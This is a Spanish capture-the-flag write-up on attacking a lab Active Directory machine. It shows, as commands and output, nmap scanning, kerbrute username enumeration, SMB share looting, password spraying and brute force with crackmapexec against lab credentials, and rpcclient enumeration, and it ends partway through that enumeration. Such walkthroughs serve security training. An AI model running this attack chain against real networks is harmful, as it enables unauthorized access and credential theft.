---
title: "Pacharan - TheHackerLabs"
date: 2025-02-24
draft: false
slug: "THL-writeup-pacharan"
excerpt: "Esta fue una máquina algo complicada. Después de analizar los escaneos, descubrimos que estamos ante un Active Directory (AD) y asumimos que no podemos hacer nada más que comenzar a enumerar usuarios al servicio Kerberos, esto para encontrar usuarios válidos que puedan ser utilizados para enumerar el servicio SMB. Encontrando un usuario válido, podemos enumerar los recursos compartidos del SMB en donde encontramos una contraseña de otro usuario. Aplicando Password Spraying, descubrimos a quién le pertenece esta contraseña. Usamos esas nuevas credenciales para volver a enumerar los recursos compartidos del SMB, encontrando otro archivo que contiene una lista de contraseñas. Aplicando Fuerza Bruta con crackmapexec, descubrimos a un usuario con una contraseña válida de la lista. Con estas nuevas credenciales, enumeramos el servicio RPC, en donde encontramos una contraseña en texto claro al mostrar la información de las impresoras activas. Usamos esa contraseña para aplicar Password Spraying a todos los usuarios del AD, descubriendo a quien le pertenece. Usamos estas nuevas credenciales para entrar el servicio WinRM con la herramienta evil-winrm. Por último, dentro de la máquina vemos que tenemos el permiso SeLoadDriverPrivilege, del cual nos podemos aprovechar para poder escalar privilegios."
categories: ["TheHackerLabs", "Medium Machine"]
tags: ["Windows", "Active Directory", "Kerberos", "SMB", "RPC", "Kerberos Enumeration", "SMB Enumeration", "RPC Enumeration", "Local Privilege Escalation (LPE)", "System Recognition (Windows)", "Abusing SeLoadDriverPrivilege Privilege", "CVE-2024-35250 (LPE)", "Privesc - Abusing SeLoadDriverPrivilege Privilege", "Privesc - CVE-2024-35250 (LPE)", "OSCP Style", "Metasploit Framework"]
tools:
  - "ping"
  - "nmap"
  - "arp-scan"
  - "crackmapexec"
  - "smbmap"
  - "kerbrute_linux_amd64"
  - "rpcclient"
  - "evil-winrm"
  - "git"
  - "rlwrap"
  - "nc"
  - "msfvenom"
  - "Metasploit Framework (msfconsole)"
  - "Meterpreter"
  - "Módulo: exploit/windows/misc/hta_server"
  - "Módulo: post/multi/recon/local_exploit_suggester"
  - "Módulo: exploit/windows/local/cve_2024_35250_ks_driver"
links:
  - "https://github.com/ropnop/kerbrute"
  - "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html?highlight=SeLoadDriverPrivilege#seloaddriverprivilege"
  - "https://github.com/JoshMorrison99/SeLoadDriverPrivilege?tab=readme-ov-file"
  - "https://github.com/k4sth4/SeLoadDriverPrivilege"
  - "https://www.tarlogic.com/es/blog/explotacion-seloaddriverprivilege/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-pacharan/pacharan.jpg"
---

## Recopilación de Información {#Recopilacion}

### Descubrimiento de Hosts {#Hosts}

Hagamos un descubrimiento de hosts para encontrar a nuestro objetivo.

Lo haremos primero con **nmap**:
```bash
nmap -sn 192.168.69.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-24 13:26 CST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.69.69
Host is up (0.00092s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 1.94 seconds
```

Vamos a probar la herramienta **arp-scan**:
```bash
arp-scan -I eth0 -g 192.168.69.0/24
Interface: eth0, type: EN10MB, MAC:XX, IPv4: Tu_IP
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.69.69	XX	PCS Systemtechnik GmbH
.
3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.081 seconds (123.02 hosts/sec). 3 responded
```

Encontramos nuestro objetivo y es: `192.168.69.69`

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.69.69
PING 192.168.69.69 (192.168.69.69) 56(84) bytes of data.
64 bytes from 192.168.69.69: icmp_seq=1 ttl=128 time=1.51 ms
64 bytes from 192.168.69.69: icmp_seq=2 ttl=128 time=1.03 ms
64 bytes from 192.168.69.69: icmp_seq=3 ttl=128 time=0.838 ms
64 bytes from 192.168.69.69: icmp_seq=4 ttl=128 time=0.824 ms

--- 192.168.69.69 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3008ms
rtt min/avg/max/mdev = 0.824/1.048/1.505/0.275 ms
```
Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.69.69 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-24 13:27 CST
Initiating ARP Ping Scan at 13:27
Scanning 192.168.69.69 [1 port]
Completed ARP Ping Scan at 13:27, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:27
Scanning 192.168.69.69 [65535 ports]
Discovered open port 139/tcp on 192.168.69.69
Discovered open port 53/tcp on 192.168.69.69
Discovered open port 445/tcp on 192.168.69.69
Discovered open port 135/tcp on 192.168.69.69
Discovered open port 389/tcp on 192.168.69.69
Discovered open port 49667/tcp on 192.168.69.69
Discovered open port 49671/tcp on 192.168.69.69
Discovered open port 49676/tcp on 192.168.69.69
Discovered open port 49665/tcp on 192.168.69.69
Discovered open port 49664/tcp on 192.168.69.69
Discovered open port 3269/tcp on 192.168.69.69
Discovered open port 60909/tcp on 192.168.69.69
Discovered open port 49666/tcp on 192.168.69.69
Discovered open port 3268/tcp on 192.168.69.69
Discovered open port 49673/tcp on 192.168.69.69
Discovered open port 5985/tcp on 192.168.69.69
Discovered open port 49669/tcp on 192.168.69.69
Discovered open port 593/tcp on 192.168.69.69
Discovered open port 636/tcp on 192.168.69.69
Discovered open port 88/tcp on 192.168.69.69
Discovered open port 47001/tcp on 192.168.69.69
Discovered open port 49670/tcp on 192.168.69.69
Increasing send delay for 192.168.69.69 from 0 to 5 due to max_successful_tryno increase to 4
Discovered open port 464/tcp on 192.168.69.69
Discovered open port 49691/tcp on 192.168.69.69
Discovered open port 9389/tcp on 192.168.69.69
Completed SYN Stealth Scan at 13:27, 41.39s elapsed (65535 total ports)
Nmap scan report for 192.168.69.69
Host is up, received arp-response (0.0020s latency).
Scanned at 2025-02-24 13:27:08 CST for 41s
Not shown: 65510 closed tcp ports (reset)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 128
88/tcp    open  kerberos-sec     syn-ack ttl 128
135/tcp   open  msrpc            syn-ack ttl 128
139/tcp   open  netbios-ssn      syn-ack ttl 128
389/tcp   open  ldap             syn-ack ttl 128
445/tcp   open  microsoft-ds     syn-ack ttl 128
464/tcp   open  kpasswd5         syn-ack ttl 128
593/tcp   open  http-rpc-epmap   syn-ack ttl 128
636/tcp   open  ldapssl          syn-ack ttl 128
3268/tcp  open  globalcatLDAP    syn-ack ttl 128
3269/tcp  open  globalcatLDAPssl syn-ack ttl 128
5985/tcp  open  wsman            syn-ack ttl 128
9389/tcp  open  adws             syn-ack ttl 128
47001/tcp open  winrm            syn-ack ttl 128
49664/tcp open  unknown          syn-ack ttl 128
49665/tcp open  unknown          syn-ack ttl 128
49666/tcp open  unknown          syn-ack ttl 128
49667/tcp open  unknown          syn-ack ttl 128
49669/tcp open  unknown          syn-ack ttl 128
49670/tcp open  unknown          syn-ack ttl 128
49671/tcp open  unknown          syn-ack ttl 128
49673/tcp open  unknown          syn-ack ttl 128
49676/tcp open  unknown          syn-ack ttl 128
49691/tcp open  unknown          syn-ack ttl 128
60909/tcp open  unknown          syn-ack ttl 128
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 41.64 seconds
           Raw packets sent: 128995 (5.676MB) | Rcvd: 65539 (2.622MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Hay muchos puertos abiertos, pero estoy viendo algunos que nos dicen que estamos contra una máquina con **Active Directory (AD)**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49673,49676,49691,60909 192.168.69.69 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-24 13:30 CST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.69.69
Host is up (0.0016s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-24 18:29:21Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PACHARAN.THL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PACHARAN.THL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
60909/tcp open  msrpc         Microsoft Windows RPC
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: WIN-VRU3GG3DPLJ; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:

|_clock-skew: -1h01m36s
| smb2-time: 
|   date: 2025-02-24T18:30:15
|_  start_date: 2025-02-24T12:10:46
|_nbstat: NetBIOS name: WIN-VRU3GG3DPLJ, NetBIOS user: <unknown>, NetBIOS MAC: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.43 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Bien, confirmamos que estamos contra un **AD** y podemos ver que el **servicio SMB** parece necesitar credenciales para poder entrar. Además, parece que hubo un problema para escanear el **puerto 53** que pertenece al **servicio DNS**. Por lo que yo empezaría por el **puerto 88** que es **servicio Kerberos**.

También pudimos ver el dominio del **AD**, este lo puedes registrar en el `/etc/hosts` quedando de la siguiente manera:
```bash
192.168.69.69 PACHARAN.THL
```
Con esto listo, continuemos.

## Análisis de Vulnerabilidades {#Analisis}

### Enumeración de Usuarios del Servicio Kerberos {#Kerberos}

Necesitaremos comprobar si podemos usar un usuario X para poder ver y listar los recursos compartidos del **servicio SMB**.

Pero como no tenemos ningún usuario, vamos a tratar de obtener algunos con la herramienta **Kerbrute**.

Usaremos su función de enumeración de usuarios y un wordlists que contenga usuarios:
```bash
./kerbrute_linux_amd64 userenum -d PACHARAN.THL --dc 192.168.69.69 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 02/24/25 - Ronnie Flathers @ropnop

2025/02/24 13:48:32 >  Using KDC(s):
2025/02/24 13:48:32 >  	192.168.69.69:88

2025/02/24 13:48:37 >  [+] VALID USERNAME:	 chivas@PACHARAN.THL
2025/02/24 13:49:04 >  [+] VALID USERNAME:	 hendrick@PACHARAN.THL
2025/02/24 13:49:07 >  [+] VALID USERNAME:	 whisky@PACHARAN.THL
2025/02/24 13:49:11 >  [+] VALID USERNAME:	 gordons@PACHARAN.THL
2025/02/24 13:49:34 >  [+] VALID USERNAME:	 redlabel@PACHARAN.THL
2025/02/24 13:49:49 >  [+] VALID USERNAME:	 beefeater@PACHARAN.THL
2025/02/24 13:49:53 >  [+] VALID USERNAME:	 Chivas@PACHARAN.THL
2025/02/24 13:50:28 >  [+] VALID USERNAME:	 invitado@PACHARAN.THL
2025/02/24 13:55:35 >  [+] VALID USERNAME:	 administrador@PACHARAN.THL
```
Encontramos varios usuarios. Te recomiendo que los guardes en un archivo de texto, por si los tenemos que usar más adelante.

Podríamos probar con cualquiera, pero el único que nos va a funcionar es el **usuario invitado**.

Comprobémoslo con **smbmap**:
```bash
smbmap -H 192.168.69.69 -d PACHARAN.THL -u 'invitado'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)

|---|---|---|---|---|---|---|---|---|
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 192.168.69.69:445	Name: PACHARAN.THL        	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Admin remota
	C$                                                	NO ACCESS	Recurso predeterminado
	IPC$                                              	READ ONLY	IPC remota
	NETLOGON                                          	NO ACCESS	Recurso compartido del servidor de inicio de sesión 
	NETLOGON2                                         	READ ONLY	
	PACHARAN                                          	NO ACCESS	
	PDF Pro Virtual Printer                           	NO ACCESS	Soy Hacker y arreglo impresoras
	print$                                            	NO ACCESS	Controladores de impresora
	SYSVOL                                            	NO ACCESS	Recurso compartido del servidor de inicio de sesión 
	Users                                             	NO ACCESS	
[*] Closed 1 connections
```
Funciona bien. Bastante curioso ese recurso llamado `PDF Pro Virtual Printer`, más que nada por su descripción.

Veamos que podemos encontrar.

### Enumeración de Servicio SMB {#SMB}

Antes que nada, podemos comprobar que este servicio necesita credenciales para poder ver los recursos compartidos:
```bash
crackmapexec smb 192.168.69.69
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False)
```
Ahí nos dice que esta activado el login.

Ya vimos que el **usuario invitado** puede ver el contenido del **directorio NETLOGON2**.

Veamos qué hay dentro:
```bash
smbmap -H 192.168.69.69 -d PACHARAN.THL -u 'invitado' -r NETLOGON2
    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)

|---|---|---|---|---|---|---|---|---|
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 192.168.69.69:445	Name: PACHARAN.THL        	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Admin remota
	C$                                                	NO ACCESS	Recurso predeterminado
	IPC$                                              	READ ONLY	IPC remota
	NETLOGON                                          	NO ACCESS	Recurso compartido del servidor de inicio de sesión 
	NETLOGON2                                         	READ ONLY	
	./NETLOGON2
	dr--r--r--                0 Wed Jul 31 11:25:34 2024	.
	dr--r--r--                0 Wed Jul 31 11:25:34 2024	..
	fr--r--r--               22 Wed Jul 31 11:25:55 2024	Orujo.txt
	PACHARAN                                          	NO ACCESS
....
....
```
Hay un archivo de texto.

Vamos a descargarlo:
```bash
smbmap -H 192.168.69.69 -d PACHARAN.THL -u 'invitado' --download NETLOGON2/Orujo.txt
    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)

|---|---|---|---|---|---|---|---|---|
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
[+] Starting download: NETLOGON2\Orujo.txt (22 bytes)                                                                    
[+] File output to: /../TheHackersLabs/Pacharan/content/192.168.69.69-NETLOGON2_Orujo.txt
[*] Closed 1 connections
```

Veamos que contiene este archivo:
```bash
cat 192.168.69.69-NETLOGON2_Orujo.txt
Pericodelospalotes6969
```
Parece ser una contraseña.

Podríamos comprobar si esta contraseña es de algún usuario que ya tenemos.  

Podemos aplicar **password spraying** con **crackmapexec**:
```bash
crackmapexec smb 192.168.69.69 -u users.txt -p 'Pericodelospalotes6969' --no-brute --continue-on-success
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False)
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\chivas:Pericodelospalotes6969 STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\hendrick:Pericodelospalotes6969 STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\whisky:Pericodelospalotes6969 STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\gordons:Pericodelospalotes6969 STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\redlabel:Pericodelospalotes6969 STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\beefeater:Pericodelospalotes6969 STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\invitado:Pericodelospalotes6969 STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\administrador:Pericodelospalotes6969 STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\:Pericodelospalotes6969
```
Parece que no pertenece a ninguno.

Quizá el nombre del archivo es el nombre de un usuario. Vamos a comprobarlo:
```bash
crackmapexec smb 192.168.69.69 -u 'Orujo' -p 'Pericodelospalotes6969'
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False)
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Orujo:Pericodelospalotes6969
```
En efecto, es un usuario.

Veamos que puede ver este usuario:
```bash
smbmap -H 192.168.69.69 -d PACHARAN.THL -u 'Orujo' -p 'Pericodelospalotes6969'
    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)

|---|---|---|---|---|---|---|---|---|
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 192.168.69.69:445	Name: PACHARAN.THL        	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Admin remota
	C$                                                	NO ACCESS	Recurso predeterminado
	IPC$                                              	READ ONLY	IPC remota
	NETLOGON                                          	READ ONLY	Recurso compartido del servidor de inicio de sesión 
	NETLOGON2                                         	NO ACCESS	
	PACHARAN                                          	READ ONLY	
	PDF Pro Virtual Printer                           	NO ACCESS	Soy Hacker y arreglo impresoras
	print$                                            	NO ACCESS	Controladores de impresora
...
...
```
Parece que podemos ver el **directorio PACHARAN**.

Veamos su contenido:
```bash
smbmap -H 192.168.69.69 -d PACHARAN.THL -u 'Orujo' -p 'Pericodelospalotes6969' -r PACHARAN
    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)

|---|---|---|---|---|---|---|---|---|
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 192.168.69.69:445	Name: PACHARAN.THL        	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Admin remota
	C$                                                	NO ACCESS	Recurso predeterminado
	IPC$                                              	READ ONLY	IPC remota
	NETLOGON                                          	READ ONLY	Recurso compartido del servidor de inicio de sesión 
	NETLOGON2                                         	NO ACCESS	
	PACHARAN                                          	READ ONLY	
	./PACHARAN
	dr--r--r--                0 Wed Jul 31 11:21:13 2024	.
	dr--r--r--                0 Wed Jul 31 11:21:13 2024	..
	fr--r--r--              921 Wed Jul 31 11:21:13 2024	ah.txt
	PDF Pro Virtual Printer                           	NO ACCESS	Soy Hacker y arreglo impresoras
...
...
```
Parece ser otro archivo de texto.

Vamos a descargarlo:
```bash
smbmap -H 192.168.69.69 -d PACHARAN.THL -u 'Orujo' -p 'Pericodelospalotes6969' --download PACHARAN/ah.txt
    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)

|---|---|---|---|---|---|---|---|---|
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
[+] Starting download: PACHARAN\ah.txt (921 bytes)
[+] File output to: /../TheHackersLabs/Pacharan/content/192.168.69.69-PACHARAN_ah.txt          
[*] Closed 1 connections
```

Y veamos su contenido:
```bash
cat 192.168.69.69-PACHARAN_ah.txt
Mamasoystreamer1!
Mamasoystreamer2@
Mamasoystreamer3#
...
...
```
Es una lista de posibles contraseñas de algún usuario.

Probemos si alguno de los usuarios que tenemos tiene una contraseña que este dentro de esta lista.

Lo haremos con **crackmapexec**:
```bash
crackmapexec smb 192.168.69.69 -u users.txt -p ah.txt
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False)
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\chivas:Mamasoystreamer1! STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\chivas:Mamasoystreamer2@ STATUS_LOGON_FAILURE
...
...
...
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\whisky:***
```
Encontramos una contraseña que le pertenece al **usuario whisky**.

Podríamos probar si este usuario puede enumerar algo más de este servicio, pero te adelanto que no hay nada más.

Por lo que podemos continuar con otro servicio.

## Explotación de Vulnerabilidades {#Explotacion}

### Enumeración del Servicio RPC y Obteniendo Sesión con evil-winrm {#RPC}

Lo siguiente que podemos hacer, es ver si podemos enumerar el **servicio RPC**.

Esto lo haremos con el último usuario y contraseña que encontramos, utilizando la herramienta **rpcclient**:
```batch
rpcclient -U "whisky%*********" 192.168.69.69
rpcclient $> enumdomusers
user:[Administrador] rid:[0x1f4]
user:[Invitado] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[Orujo] rid:[0x44f]
user:[Ginebra] rid:[0x450]
user:[Whisky] rid:[0x452]
user:[Hendrick] rid:[0x453]
user:[Chivas Regal] rid:[0x454]
user:[Whisky2] rid:[0x457]
user:[JB] rid:[0x458]
user:[Chivas] rid:[0x459]
user:[beefeater] rid:[0x45a]
user:[CarlosV] rid:[0x45b]
user:[RedLabel] rid:[0x45c]
user:[Gordons] rid:[0x45d]
```
Bien, entramos y funcionan los comandos que usemos. Aquí ya usamos el comando **enumdomusers** para obtener todos los usuarios registrados.

Veamos si podemos obtener alguna contraseña al revisar la descripción de los usuarios con el comando **querydispinfo**:
```batch
rpcclient $> querydispinfo
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrador	Name: (null)	Desc: Cuenta integrada para la administración del equipo o dominio
index: 0x109c RID: 0x45a acb: 0x00020010 Account: beefeater	Name: Beefeater	Desc: (null)
index: 0x109d RID: 0x45b acb: 0x00020010 Account: CarlosV	Name: CarlosV	Desc: (null)
index: 0x109b RID: 0x459 acb: 0x00020010 Account: Chivas	Name: Chivas	Desc: (null)
index: 0x1096 RID: 0x454 acb: 0x00000210 Account: Chivas Regal	Name: Chivas Regal	Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount	Name: (null)	Desc: Cuenta de usuario administrada por el sistema.
index: 0x1092 RID: 0x450 acb: 0x00020010 Account: Ginebra	Name: Ginebra	Desc: (null)
index: 0x109f RID: 0x45d acb: 0x00020010 Account: Gordons	Name: Gordons	Desc: (null)
index: 0x1095 RID: 0x453 acb: 0x00020010 Account: Hendrick	Name: Hendrick	Desc: (null)
